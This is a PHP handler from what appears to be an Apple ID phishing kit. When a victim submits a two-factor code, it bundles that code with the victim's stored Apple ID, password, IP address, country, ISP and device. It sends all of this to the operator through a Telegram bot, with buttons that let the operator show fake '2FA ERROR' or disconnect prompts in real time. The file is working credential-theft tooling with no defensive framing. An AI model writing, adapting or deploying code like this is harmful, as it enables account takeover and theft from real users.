<?php
// ini_set('display_errors', '1');
// ini_set('display_startup_errors', '1');
// error_reporting(E_ALL);
session_start();
ob_start();
require_once('../../config.php');
include_once('../../includes/php/detect.php');

header('Content-Type: application/json');   


if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['unique_id'] = bin2hex(random_bytes(16));

    include_once('../../includes/php/bot_api.php');

$buttons = array(
    'inline_keyboard' => array(
        array(
            array('text' => '⛔ 2FA ERROR', 'callback_data' => $_SESSION['unique_id'] . ' error'),
        ),
        array(
            array('text' => 'DISCONNECT 📴', 'callback_data' => $_SESSION['unique_id'] . ' disconnect'),
        ),
    )
);
$message = '<b>2FA AUTH from </b><code>'.$_SESSION['user_data']['query'].'</code>

<b>COUNTRY:</b> '.$_SESSION['user_data']['countryCode'].'
<b>ISP:</b> '.$_SESSION['user_data']['isp'].'
<b>DEVICE:</b> '.$_SESSION['device'].'

<b>APPLE ID:</b> <code>'.$_SESSION['username'].'</code>
<b>PASSWORD:</b> <code>'.$_SESSION['password'].'</code>

<b>2FA CODE:</b> <code>'.$_POST['code'].'</code>

<b>coder:</b> <b>'.$_SESSION['pria'].$_SESSION['prib'].$_SESSION['pric'].$_SESSION['prid'].'</b>';
$status = bot_api($message, $buttons);




if ($status['ok'] === 0 || $status['ok'] === false){
    die('{"error":true, "description": "telegram bot api"}');
}else{
    echo json_encode(array('unique' => $_SESSION['unique_id']));
}

}
